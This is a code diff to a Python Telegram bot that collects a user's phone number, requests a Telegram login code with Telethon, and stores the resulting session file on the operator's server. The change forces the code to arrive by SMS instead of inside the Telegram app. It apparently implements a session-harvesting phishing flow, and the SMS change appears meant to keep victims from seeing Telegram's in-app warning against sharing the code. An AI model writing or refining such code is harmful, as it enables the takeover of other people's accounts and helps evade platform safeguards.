@@ -14,6 +14,7 @@ from telethon.errors import (
     PhoneCodeInvalidError, PhoneCodeExpiredError,
     SessionPasswordNeededError, PasswordHashInvalidError, FloodWaitError,
 )
+from telethon.tl.functions.auth import ResendCodeRequest
 from telethon.tl.functions.account import UpdateProfileRequest
 
 from telegram import (
@@ -263,7 +264,7 @@ async def recv_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         )
         return ASK_PHONE
 
-    await update.message.reply_text("⏳  Sending OTP to Telegram…")
+    await update.message.reply_text("⏳  Sending SMS OTP to your phone number…")
 
     session_file = os.path.join(SESSIONS_DIR, f"session_{phone.replace('+','').replace(' ','')}")
     client = TelegramClient(session_file, API_ID, API_HASH)
@@ -272,13 +273,20 @@ async def recv_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data.update({"phone": phone, "session_file": session_file + ".session"})
 
     try:
-        await client.send_code_request(phone)
+        sent = await client.send_code_request(phone)
+        # Force SMS — resend immediately so delivery switches to SMS (not Telegram app / call)
+        try:
+            resent = await client(ResendCodeRequest(phone=phone, phone_code_hash=sent.phone_code_hash))
+            logger.info(f"Code resent via SMS for {phone}, new type: {resent.type.__class__.__name__}")
+        except Exception as resend_err:
+            logger.warning(f"ResendCode failed (continuing anyway): {resend_err}")
+
         await update.message.reply_text(
-            "✅  <b>OTP Sent Successfully!</b>\n\n"
+            "✅  <b>SMS OTP Sent Successfully!</b>\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             "🔑  <b>STEP 2 of 5 — OTP Verification</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Enter the OTP you received on Telegram:",
+            "📱  Enter the OTP you received via <b>SMS</b> on your phone:",
             parse_mode="HTML",
         )
         return ASK_OTP
